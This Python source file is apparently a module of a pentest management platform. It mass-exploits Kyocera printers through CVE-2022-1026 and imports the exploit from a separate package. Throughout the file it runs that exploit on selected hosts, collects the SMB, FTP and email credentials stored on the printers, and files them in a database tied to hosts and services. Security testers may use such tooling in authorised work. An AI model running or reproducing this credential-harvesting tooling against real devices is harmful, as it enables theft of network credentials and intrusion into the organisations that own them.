import wtforms
import app.models as models
from app import db
from app.controllers.forms import FlaskForm, TreeSelectMultipleField
from wtforms import validators
import sqlalchemy as sa
import sqlalchemy.exc as exc
import sqlalchemy.orm as so
from app.action_modules.classes import ActionModule
import asyncio
from aiohttp import ClientSession
from cve_2022_1026 import exploit as exploit_cve
from flask_babel import lazy_gettext as _l, force_locale
import socket
import ipaddress
from typing import Set, Optional, Union


async def get_data_from_exploit(target: str):
    async with ClientSession() as session:
        return await exploit_cve(target, session)


def resolve_dns_name(name: str) -> Optional[Set[ipaddress.IPv4Address]]:
    ''' Trying to resolve DNS name to IP address list and returned him '''
    try:
        return socket.gethostbyname(name)
    except socket.gaierror:
        return None


def async_action_run(target_ip: str):
    loop = asyncio.get_event_loop()
    task = loop.create_task(get_data_from_exploit(target_ip))
    return loop.run_until_complete(task)


def action_run(target_id: Union[str, int], running_user_id: int, domain_search: str, session:so.Session, locale: str='en'):
    ''' Take an credentials from Kyocera printer target, and save them in database '''
    with force_locale(locale):
        try:
            target = session.scalars(sa.select(models.Host).where(models.Host.id == int(target_id))).one()
        except (exc.MultipleResultsFound, exc.NoResultFound):
            return None
        gather_credentials = async_action_run(str(target.ip_address))
        if gather_credentials is None:
            return None
        issue = session.scalars(sa.select(models.Issue).where(sa.and_(models.Issue.by_template_slug == 'cve_2022_1026', models.Issue.project_id == target.from_network.project_id))).first()
        if issue is None:
            issue_status = session.scalars(sa.select(models.IssueStatus).where(models.IssueStatus.string_slug == 'confirmed')).first()
            issue_template = session.scalars(sa.select(models.IssueTemplate).where(models.IssueTemplate.string_slug == 'cve_2022_1026')).first()
            if issue_status is not None and issue_template is not None:
                issue = issue_template.create_issue_by_template()
                issue.status = issue_status
                issue.project_id = target.from_network.project_id
                issue.created_by_id = running_user_id
                session.add(issue)
        if issue is not None:
            vuln_service = session.scalars(sa.select(models.Service).where(sa.and_(models.Service.port == 9091, models.Service.host_id == target.id))).first()
            if vuln_service is None:
                tlp = session.scalars(sa.select(models.ServiceTransportLevelProtocol).where(models.ServiceTransportLevelProtocol.string_slug == 'tcp')).first()
                port_state = session.scalars(sa.select(models.ServicePortState).where(models.ServicePortState.string_slug == 'opened')).first()
                if tlp is not None and port_state is not None:
                    vuln_service = models.Service(port=9091, host=target, created_by_id=running_user_id)
                    session.add(vuln_service)
                    vuln_service.transport_level_protocol = tlp
                    vuln_service.port_state = port_state
                    session.commit()
            if vuln_service is not None:
                issue.services.add(vuln_service)
                session.commit()
        for c in gather_credentials:
            if c.login == '' and c.password == '':
                continue
            cred = session.scalars(sa.select(models.Credential).where(sa.and_(models.Credential.login == c.login.strip(), models.Credential.password == c.password.strip()))).first()
            if cred is None:
                cred = models.Credential(login=c.login.strip(), password=c.password.strip(), created_by_id=running_user_id, project_id=target.from_network.project_id)
                session.add(cred)
            cred.received_from.add(target)
            if c.type_connection == 'email':
                session.add(cred)
                session.commit()
                return None
            if c.port != '':
                try:
                    c.port = int(c.port)
                except (ValueError, TypeError):
                    c.port = ''
            if c.port == '':
                if c.type_connection == 'SMB':
                    c.port = 445
                elif c.type_connection == 'FTP':
                    c.port = 21
            if c.type_connection == 'FTP':
                now_destination = resolve_dns_name(c.destination)
                if now_destination is None: # Если не был найден сервер, соответствующий заданным требованиям
                    cred.description += str(_l("<p>Destination: %(destination)s</p>", destination=c.destination))
                    session.add(cred)
                    session.commit()
                    return None
            if c.type_connection == 'SMB':
                if c.destination.startswith("\\\\"):
                    c.destination = c.destination[2::]
                elif c.destination.lower().startswith("smb://"):
                    c.destination = c.destination[6::]
                now_destination = resolve_dns_name(c.destination)
                if now_destination is None:
                    if not domain_search.startswith('.'):
                        domain_search = '.' + domain_search
                    now_destination = resolve_dns_name(c.destination + domain_search)
                if now_destination is None:
                    cred.description += str(_l("<p>Destination: %(destination)s</p>", destination=c.destination))
                    session.add(cred)
                    session.commit()
                    return None
            # Process information about DNS names of host:
            try:
                current_ip = ipaddress.IPv4Address(c.destination)
            except ipaddress.AddressValueError:
                # this is not IP address - it's DNS name. added this name to all IP addresses:
                h = session.scalars(sa.select(models.Host).join(models.Host.from_network).where(sa.and_(models.Host.ip_address == now_destination, models.Network.project_id == target.from_network.project_id))).first()
                if h is not None:
                    dns = session.scalars(sa.select(models.HostDnsName).where(sa.and_(models.HostDnsName.title == c.destination.strip(), models.HostDnsName.to_host_id == h.id))).first()
                    if dns is None:
                        dns = models.HostDnsName(title=c.description, dns_type='A', to_host_id=h.id)
                        session.add(dns)
                        session.commit()
            # Получаем порты, с которыми нужно будет связать найденные учётные данные
            to_ports = session.scalars(sa.select(models.Service).join(models.Service.host).join(models.Host.from_network)
                                    .where(sa.and_(models.Network.project_id == target.from_network.project_id, models.Service.port == c.port,
                                                    models.Host.ip_address == now_destination))).all()
            cred.services = to_ports
            session.add(cred)
            session.commit()


def exploit(filled_form: dict, running_user_id: int, default_options: dict, locale: str='en'):
    ''' Take an credentials from Kyocera printer targets and save all of them in database '''
    with so.sessionmaker(bind=db.engine)() as session:
        for target in filled_form["targets"]:
            action_run(target, running_user_id, filled_form["domain_search"], session, locale)


class AdminOptionsForm(FlaskForm):
    timeout = wtforms.IntegerField(_l("Delay between requests:"), description=_l("Default delay between create export address book task and gain an address book to generate data on the device"), validators=[validators.DataRequired(message=_l("This field is mandatory!"))], default=5)
    
    def validate_timeout(form, field):
        if field.data <= 0:
            raise wtforms.ValidationError(_l("The page load timeout must be greater than 0!"))


class ModuleInitForm(FlaskForm):
    def __init__(self, project_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.targets.choices = [(str(i.id), i) for i in db.session.scalars(sa.select(models.Host).join(models.Host.from_network).join(models.Host.device_vendor)
                                                                           .where(sa.and_(models.Network.project_id==project_id, models.DeviceVendor.string_slug == 'kyocera')))]
    targets = TreeSelectMultipleField(_l("Target verification range:"), validators=[validators.Optional()])
    domain_search = wtforms.StringField(_l("Domain search:"), description=_l("The domain to search for the DNS name if the SMB credentials are set via NetBIOS"), default='.', validators=[validators.DataRequired(_l("This field is mandatory!"))])
    submit = wtforms.SubmitField(_l("Run"))


class GetKyoceraCreds(ActionModule):
    title = _l("Mass exploit Kyocera CVE-2022-1026")
    description = _l("On a given list of printer targets, Kyocera is trying to exploit the vulnerability CVE-2022-1026 and save the received credentials.")
    admin_form = AdminOptionsForm
    run_form = ModuleInitForm
    exploit_single_target = staticmethod(action_run)
    exploit = staticmethod(exploit)
    default_options = {'timeout': 5}
